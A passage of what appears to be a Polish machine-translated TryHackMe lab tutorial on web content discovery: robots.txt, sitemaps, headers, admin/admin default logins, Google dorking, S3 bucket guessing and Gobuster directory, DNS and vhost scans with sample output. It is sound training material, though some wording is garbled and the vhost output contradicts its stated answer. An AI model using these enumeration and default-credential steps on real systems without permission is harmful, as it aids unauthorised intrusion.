![Plik robot.txt na stronie głównej.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1777890954492.png)

Ten plik robots.txt informuje roboty indeksujące (takie jak wyszukiwarki), jak wchodzić w interakcję z witryną. Umożliwia on wszystkim botom dostęp do większości witryny ( `Allow: /`), ale prosi je, aby nie odwiedzały witryny `/staff-portal`. Należy pamiętać, że jest to jedynie wskazówka dla botów, a nie mechanizm bezpieczeństwa, więc zastrzeżone ścieżki mogą być nadal dostępne po bezpośrednim odwiedzeniu.

## mapa witryny.xml

W przeciwieństwie do pliku robots.txt (który ogranicza roboty indeksujące), plik sitemap.xml informuje wyszukiwarki, które strony właściciel _chce_ wyświetlić. Pliki te czasami zawierają strony tymczasowe, starą treść lub adresy URL, do których trudno dotrzeć za pośrednictwem standardowej witryny. Sprawdź to na `http://MACHINE_IP/sitemap.xml`.

![sitemap.xml ze strony głównej.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1777890954260.png)

Jak pokazano na obrazku, ta mapa witryny zawiera listę konkretnych punktów końcowych dostępnych w aplikacji docelowej, w tym standardowe strony, takie jak `/news`, `/contact`i wiele identyfikatorów artykułów ( `/news/article?id=1,2,3`). Co ważniejsze, ujawnia ona wrażliwe lub interesujące ścieżki, takie jak `/customers/login`i `/s3cr3t-area`, które mogą być trudne do odnalezienia podczas normalnego przeglądania. Obecność parametrów, takich jak , `id=`wskazuje również potencjalne punkty wejściowe warte przetestowania. Dzięki temu mapa witryny jest cennym źródłem podczas rekonesansu w celu mapowania powierzchni ataku.

Odpowiedz na poniższe pytania

Który katalog w pliku robots.txt nie jest dostępny dla robotów indeksujących?

## HTTPNagłówki

Gdy serwer WWW odpowiada na żądanie, uwzględniaHTTPNagłówki, które mogą ujawnić przydatne szczegóły techniczne. Nagłówki, takie jak `Server`i `X-Powered-By`często, ujawniają oprogramowanie serwera WWW oraz język lub strukturę, w której działa aplikacja.

Uruchom poniższe polecenie na serwerze internetowym Acme IT Support. `-v`Flaga włącza szczegółowe dane wyjściowe, w tym nagłówki odpowiedzi:

Terminal

```shell-session
root@tryhackme:~# curl http://MACHINE_IP -v
*   Trying MACHINE_IP:80...
* TCP_NODELAY set
* Connected to MACHINE_IP (MACHINE_IP) port 80 (#0)
> GET / HTTP/1.1
> Host: MACHINE_IP
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 04 May 2026 10:39:13 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-FLAG: [REDACTED]
< X-FLAG: [REDACTED]
< X-Powered-By: THM-Framework
< 
<!--
This page is temporary while we work on the new homepage @ /new-home-beta
-->
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Home</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li class="active"><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <div class="row">
        <div class="col-md-8 col-md-offset-2 text-center">
            <img src="/assets/staff.png">
            <p class="welcome-msg">Our dedicated staff are ready <a href="/secret-page">to</a> assist you with your IT problems.</p>
        </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.04765 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
* Connection #0 to host 10.82.123.47 left intact
```

Uważnie przejrzyj nagłówki odpowiedzi; może się zdarzyć, że znajdziesz tam niestandardowy nagłówek zawierający flagę.

## Stos frameworków

Po zidentyfikowaniu frameworka (na podstawie ikony favicon, nagłówków lub po sprawdzeniu kodu źródłowego strony pod kątem komentarzy i informacji o prawach autorskich) odwiedź witrynę internetową frameworka, aby dowiedzieć się więcej. Strony dokumentacji często opisują domyślne struktury katalogów, ścieżki do panelu administracyjnego i domyślne dane uwierzytelniające.

![Link do panelu administratora.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1777909215562.png)

Zobacz kod źródłowy strony Acme IT Support pod adresem `http://MACHINE_IP`. Na dole każdej strony znajduje się komentarz z linkiem do witryny frameworka. Kliknij ten link i sprawdź dokumentację, aby znaleźć ścieżkę do portalu administracyjnego. Przejdź do tej ścieżki na stronie Acme IT Support i zaloguj się, używając domyślnych   danych logowania `admin`/, `admin`aby pobrać flagę.

Odpowiedz na poniższe pytania

Jaka jest wartość flagi z nagłówka X-FLAG?

Dostępne są również zasoby zewnętrzne, które mogą pomóc w odkryciu informacji o docelowej witrynie; zasoby te są często określane jakoOSINT(Open-Source Intelligence), ponieważ są to swobodnie dostępne narzędzia służące do gromadzenia informacji:

## Google Hacking / Dorking

Zaawansowane operatory wyszukiwania Google pozwalają filtrować wyniki w sposób, który pozwala na odnalezienie poufnych treści zindeksowanych w Twoim celu. Łącząc operatory, możesz znaleźć ujawnione panele administracyjne, wyciekłe dokumenty i strony logowania, których właściciel witryny nigdy nie zamierzał upublicznić.

|Filtr|Przykład|Opis|
|---|---|---|
|`site`|`site:tryhackme.com`|Zwraca wyniki tylko z określonej domeny|
|`inurl`|`inurl:admin`|Zwraca wyniki zawierające określone słowo w adresie URL|
|`filetype`|`filetype:pdf`|Zwraca wyniki dla określonego typu pliku|
|`intitle`|`intitle:admin`|Zwraca wyniki zawierające określone słowo w tytule strony|
|`intext`|`intext:password`|Zwraca wyniki zawierające określone słowo w treści|
|`cache`|`cache:tryhackme.com`|Pokazuje wersję strony zapisaną w pamięci podręcznej Google|

Na przykład `site:tryhackme.com filetype:pdf`zwróci wszystkie pliki PDF zindeksowane z tryhackme.com. Możesz łączyć wiele filtrów w jednym zapytaniu. Więcej informacji znajdziesz w [Wikipedii: Google Hacking(otwiera się w nowej karcie)](https://en.wikipedia.org/wiki/Google_hacking).

## Wappalyzer

[Wappalyzer(otwiera się w nowej karcie)](https://www.wappalyzer.com/)jest rozszerzeniem przeglądarki i narzędziem online, które identyfikuje technologie, struktury, z których korzysta witryna internetowa,CMSPlatformy, sieci CDN, narzędzia analityczne, procesory płatności i wiele innych. Często wykrywa numery wersji, co pomaga w wyszukiwaniu znanych luk w zabezpieczeniach. Zainstaluj go ze sklepu z rozszerzeniami przeglądarki i odwiedź dowolną stronę, aby natychmiast zapoznać się ze stosem technologicznym.

Odpowiedz na poniższe pytania

Który operator Google'a ogranicza wyniki do konkretnej witryny?

## Wayback Machine

Maszyna [Wayback(otwiera się w nowej karcie)](https://web.archive.org/)to archiwum Internetu sięgające końca lat 90. XX wieku. Wyszukaj domenę, a zobaczysz każdą migawkę zarejestrowaną na przestrzeni lat. Jest to przydatne do znajdowania stron, które zostały usunięte z działającej witryny, ale nadal mogą być dostępne: stare formularze logowania, zapomniane API punkty końcowe lub treści opublikowane krótko przed usunięciem.

# GitHub

[Git(otwiera się w nowej karcie)](https://git-scm.com/)to **system kontroli wersji** , który śledzi zmiany w plikach w czasie. GitHub to najpopularniejsza platforma hostowana w chmurze.Gitrepozytoria. Deweloperzy czasami przypadkowo udostępniają poufne dane:APIklucze, dane uwierzytelniające, pliki konfiguracyjne i `.env`inne pliki, zanim zorientujesz się, że repozytorium jest publiczne.

Wyszukaj w GitHubie nazwę firmy lub domenę, której szukasz. Po znalezieniu odpowiedniego repozytorium przejrzyj historię zatwierdzania, a nie tylko bieżące pliki. Dane wrażliwe są często usuwane w późniejszym zatwierdzaniu, ale pozostają w historii.

## Wiadra S3

[Amazon S3(otwiera się w nowej karcie)](https://aws.amazon.com/pm/serv-s3/)(Simple Storage Service) to platforma pamięci masowej w chmurze, z której wiele organizacji korzysta do hostowania plików i statycznej zawartości stron internetowych. Format adresu URL dla kontenera S3 to `https://{name}.s3.amazonaws.com`. Właściciele kontenerów ustawiają uprawnienia, ale częste są błędy w konfiguracji: publicznie dostępny kontener może ujawnić pliki, które nigdy nie miały być widoczne.

Typowe wzorce nazewnictwa to `{company}-assets`, `{company}-backup`, `{company}-www`i `{company}-dev`. Wypróbuj te wzorce w nazwie firmy docelowej. Adresy URL kontenerów można również znaleźć w kodzie źródłowym strony witryny lub w repozytoriach GitHub.

Odpowiedz na poniższe pytania

Jaki jest adres strony internetowej Wayback Machine?

Sprawdzać

Jaki format adresu URL mają kończące się kontenery Amazon S3? (Odpowiedź zaczyna się od `.`)

Instrukcja iOSINTTechniki te nie dają wielkich możliwości. Automatyczne wykrywanie wykorzystuje narzędzia do szybkiego wysyłania setek lub tysięcy żądań do serwera WWW w celu sprawdzenia, czy istnieją katalogi, pliki lub inne zasoby. Proces ten opiera się na **listach słów, czyli**  plikach tekstowych zawierających często używane nazwy katalogów, nazwy plików i ścieżki.

## Gobuster

[Gobuster(otwiera się w nowej karcie)](https://github.com/OJ/gobuster)to narzędzie enumeracyjne typu open source napisane w języku Go. Obsługuje wiele trybów: enumerację katalogów/plików ( `dir`), enumerację subdomen DNS ( `dns`) i enumerację hostów wirtualnych ( `vhost`). Jest preinstalowane na urządzeniu AttackBox i domyślnie dołączone do systemu Kali Linux.

Uruchom `gobuster --help`, aby zobaczyć dostępne polecenia i flagi globalne:

|Flaga|Opis|
|---|---|
|`-t`/`--threads`|Liczba jednoczesnych wątków (domyślnie: 10). Zwiększ, aby przyspieszyć skanowanie.|
|`-w`/`--wordlist`|Ścieżka do pliku z listą słów. Wymagana we wszystkich trybach.|
|`-o`/`--output`|Zapisuje wyniki do pliku zamiast na stdout.|
|`--delay`|Czas oczekiwania pomiędzy żądaniami: przydatny w przypadku serwerów o ograniczonej przepustowości.|

**Listy słów**

Dobra lista słów jest kluczowa [.(otwiera się w nowej karcie)](https://github.com/danielmiessler/SecLists)to najpowszechniej używana kolekcja, preinstalowana w AttackBoxie pod adresem `/usr/share/wordlists/SecLists/`. Służy do wyliczania katalogów `Discovery/Web-Content/common.txt`i `Discovery/Web-Content/directory-list-2.3-medium.txt`obejmuje większość scenariuszy.

**tryb dir**

Tryb ten `dir`atakuje katalogi i pliki na serwerze WWW metodą brute-force. Podstawowa składnia to:

```bash
gobuster dir -u "http://MACHINE_IP" -w /path/to/wordlist
```

Flaga  `-u`określa docelowy adres URL, na którym Gobuster przeprowadzi wyszukiwanie. Flaga `-w`określa plik listy słów, czyli listę nazw katalogów i plików.Gobusterspróbuje atakować cel jeden po drugim. Oba `-u`i `-w`są wymagane do uruchomienia Gobustera; pominięcie któregokolwiek z nich spowoduje błąd.

Kilka dodatkowych przydatnych flag dla `dir`trybu:

|Flaga|Opis|
|---|---|
|`-x`/`--extensions`|Rozszerzenia plików, których należy szukać (np. `-x .php,.txt,.js`)|
|`-r`/`--followredirect`|Śledź przekierowania HTTP|
|`-k`/`--no-tls-validation`|PominąćTLSweryfikacja certyfikatu (przydatna w środowiskach laboratoryjnych)|
|`-s`/`--status-codes`|Pokaż tylko określone kody statusu (np. `-s 200,301`)|

Uruchom następujące polecenie na serwerze internetowym Acme IT Support i przejrzyj wyniki:

Terminal

```shell-session
root@ip-10-82-112-63:~# gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://MACHINE_IP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://10.82.123.47/assets/]
/contact              (Status: 200) [Size: 3108]
/customers            (Status: 302) [Size: 0] [--> /customers/login]
/development.log      (Status: 200) [Size: 27]
/monthly              (Status: 200) [Size: 28]
/news                 (Status: 200) [Size: 2538]
/private              (Status: 301) [Size: 178] [--> http://10.82.123.47/private/]
/robots.txt           (Status: 200) [Size: 46]
/sitemap.xml          (Status: 200) [Size: 1383]
Progress: 4655 / 4656 (99.98%)
===============================================================
Finished
===============================================================
```

Jak pokazano na powyższym wyjściu,GobusterSkanowanie wykryło kilka dostępnych katalogów i plików w docelowej aplikacji internetowej. Ujawniło popularne strony, takie jak `/contact`i `/news`, a także interesujące punkty końcowe, takie jak `/customers`(który przekierowuje do strony logowania) i `/development.log`, które mogą zawierać poufne informacje. Ponadto znaleziono katalogi, takie jak `/private`i , a także pliki, takie jak robots.txt i mapa witryny.`/assets`xml, co może dodatkowo ułatwić rozpoznanie. Dane wyjściowe pomagają zmapować strukturę aplikacji i zidentyfikować potencjalne punkty wejścia do dalszych testów.

Odpowiedz na poniższe pytania

Jaka jest nazwa katalogu, którego nazwa zaczyna się od `/mo`litery, która została odkryta?

Następnym trybem, na którym się skupimy, jest tryb „ `dns`and” `vhost`. `dns`Tryb ten pozwala Gobusterowi na atak siłowy na subdomeny. Podczas testu penetracyjnego sprawdzenie subdomen domeny głównej celu jest kluczowe. To, że coś zostało załatane w domenie regularnej, nie oznacza, że ​​zostało również załatane w subdomenie. Może istnieć możliwość wykorzystania luki w zabezpieczeniach jednej z tych subdomen.

Na przykład, jeśli TryHackMe jest właścicielem `tryhackme.thm`domeny `mobile.tryhackme.thm`, może istnieć luka, `mobile.tryhackme.thm`której nie ma w domenie `tryhackme.thm`. Dlatego ważne jest, aby wyszukiwać również subdomeny!

## Subdomeny kontra hosty wirtualne

Ważne jest, aby zrozumieć różnicę między tymi dwoma koncepcjami, zanim użyjesz Gobustera do ich wyliczenia:

- Subdomena jest rozwiązywana przez DNS. Na przykład **,**`blog.example.thm` czyDNSrekord wskazujący na adres IP.
- Host **wirtualny (vhost)** jest rozwiązywany przez serwer WWW. Wiele witryn może działać na tym samym adresie IP, a serwer używa `Host:`nagłówka HTTP do decydowania, którą witrynę obsłużyć.

Jak wspomniano, Gobuster ma osobne tryby dla każdego z nich:  `dns`dla subdomen i `vhost`dla hostów wirtualnych.

## Przygotowanie środowiska

Będziemy pracować w sieci lokalnej z serwerem DNS na serwerze WWW. Aby upewnić się, że możemy rozpoznać domeny używane w tym pomieszczeniu, musisz zmienić plik  `/etc/resolv-dnsmasq`:

- Otwórz terminal w AttackBoxie i wpisz polecenie:  `sudo nano /etc/resolv-dnsmasq`.
- Wstaw `nameserver MACHINE_IP`jako pierwszy wiersz.
- Zapisz plik naciskając przycisk `CTRL+O`, a następnie naciśnij przycisk `ENTER`, aby wyjść z edytora naciskając przycisk `CTRL+X`.
- Wprowadź polecenie `/etc/init.d/dnsmasq restart`, aby ponownie uruchomić usługę Dnsmasq.

Plik powinien wyglądać mniej więcej tak:

Terminal AttackBox

```shell-session
root@tryhackme:~# cat /etc/resolv-dnsmasq 
nameserver MACHINE_IP
nameserver 169.254.169.253
```

## Aktualizowanie pliku hosta

Aby mieć pewność, że domena używana w tym pokoju zostanie poprawnie rozpoznana, musimy ręcznie zmapować ją na docelowy adres IP, korzystając z  `/etc/hosts`pliku:

- Otwórz terminal w AttackBoxie i uruchom: `sudo nano /etc/hosts`.
- Dodaj następujący wiersz na końcu pliku: `MACHINE_IP example.thm`.
- Zapisz plik naciskając `CTRL+O`, następnie `ENTER`, i wyjdź za pomocą `CTRL+X`.
- Możesz sprawdzić zmianę, uruchamiając: `ping example.thm`.

Plik powinien wyglądać mniej więcej tak:

Terminal AttackBox

```shell-session
root@ip-10-82-108-230:~# cat /etc/hosts
127.0.0.1	localhost
127.0.0.1   vnc.tryhackme.tech
127.0.1.1	tryhackme.lan	tryhackme

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
MACHINE_IP example.thm
```

## Tryb DNS

Tryb `dns`wykonujeDNSwyszukiwania z wykorzystaniem wpisów listy słów jako kandydatów do subdomen. Wymagane flagi to `-d`(domena) i `-w`(lista słów). `--wildcard`Opcja w Gobusterze służy do wymuszenia enumeracji nawet w przypadku wykrycia wieloznacznego DNS, co pozwala na zwracanie wyników pomimo potencjalnych fałszywie pozytywnych wyników.

W AttackBox wprowadź następujące polecenie:

Terminal

```shell-session
root@tryhackme:~# gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --wildcard
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:            example.thm
[+] Threads:           10
[+] Wildcard forced:   true
[+] Timeout:           1s
[+] Wordlist:          /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: shop.example.thm

Found: www.shop.example.thm

Found: webdisk.shop.example.thm

Found: autodiscover.shop.example.thm

Found: autoconfig.shop.example.thm

Found: academy.example.thm

Found: primary.example.thm

Progress: 4997 / 4998 (99.98%)
===============================================================
Finished
===============================================================
```

Przydatne flagi dla `dns`trybu to:

|Flaga|Opis|
|---|---|
|`-d`/`--domain`|Domena docelowa do wyliczenia|
|`-i`/`--show-ips`|Pokaż adresy IP, na które rozwiązują się subdomeny|
|`-r`/`--resolver`|Użyj niestandardowego serwera DNS do wyszukiwań|

## Tryb vhosta

Tryb `vhost`nie jest używanyDNSZamiast tego wysyła żądania HTTP do docelowego adresu IP, przechodząc cyklicznie przez wpisy listy słów jako `Host:`wartość nagłówka. W ten sposób znajduje wirtualne hosty, które nie są zarejestrowane w publicznym DNS.

Uruchom skanowanie `vhost`za pomocą następujących poleceń.  `--append-domain`Flaga nakazuje programowi Gobuster łączenie każdego wpisu na liście słów z domeną i `--exclude-length`filtrowanie wyników fałszywie dodatnich o wspólnym rozmiarze odpowiedzi:

Terminal

```shell-session
root@tryhackme:~# gobuster vhost -u "http://MACHINE_IP" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.82.123.47
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
[+] Append Domain:    true
[+] Exclude Length:   259,271,291,293,306,252,264,304,308,263,301,298,307,309,254,261,267,283,295,318,265,292,320,270,289,313,314,319,268,272,286,312,258,277,287,294,317,251,285,315,302,257,260,262,275,284,266,279,281,297,305,311,250,273,278,282,290,256,276,269,296,310,316,274,300,303,253,255,280,288,299
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4997 / 4998 (99.98%)
===============================================================
Finished
===============================================================
```

Przejrzyj wyniki i zidentyfikuj wirtualne hosty, które odpowiadają statusem `200 OK`. Otwórz każdy z nich w przeglądarce, aby sprawdzić, co jest na nich hostowane.

Jak pokazano na powyższym wyjściu, wyliczenie hosta wirtualnego zostało wykonane przy użyciuGobusterw celu zidentyfikowania ukrytych subdomen powiązanych z celem. Skanowanie wykorzystało obszerną listę słów i odfiltrowało typowe długości odpowiedzi, aby zredukować szum, koncentrując się wyłącznie na istotnych wynikach. Jednak podczas skanowania nie wykryto żadnych prawidłowych hostów wirtualnych, co wskazuje, że prawdopodobnie nie ma żadnych dodatkowych subdomen skonfigurowanych dla tej aplikacji. Sugeruje to, że dalsze testy powinny skupić się na domenie głównej i zidentyfikowanych katalogach.

Odpowiedz na poniższe pytania

Oprócz `dns`i `-w`, jaka skrócona flaga jest wymagana dla trybu DNS?

Poprawna odpowiedź

Ile wirtualnych hostów `acmeitsupport.thm`odpowiedziało kodem statusu 200?

Poprawna odpowiedź 3

Odkrywanie treści to jeden z najważniejszych etapów rekonesansu aplikacji internetowych. Techniki w tym pomieszczeniu działają ze sobą: ręczne kontrole pozwalają na szybkie odkrycia,OSINTwyszukuje informacje, którymi cel już się upublicznił, a zautomatyzowane narzędzia obejmują zakres, którego żadne z tych podejść nie jest w stanie obsłużyć samodzielnie.

Oto krótkie podsumowanie tego, co zostało omówione:

|Metoda|Techniki|
|---|---|
|Podręcznik|robots.txt, mapa witryny.xml, odcisk palca favicon,HTTPnagłówki, stos frameworków|
|OSINT|Google dorking, Wappalyzer, Wayback Machine, GitHub,S3wiadra|
|Zautomatyzowany|Gobusterreżyser,DNSi tryby vhost|

Dobry obieg pracy w zakresie odkrywania treści uruchamia wszystkie trzy metody na obiekcie docelowym przed przejściem do eksploatacji. Katalogi i pliki, które tutaj znajdziesz, są bezpośrednio wykorzystywane w późniejszych etapach testu penetracyjnego.
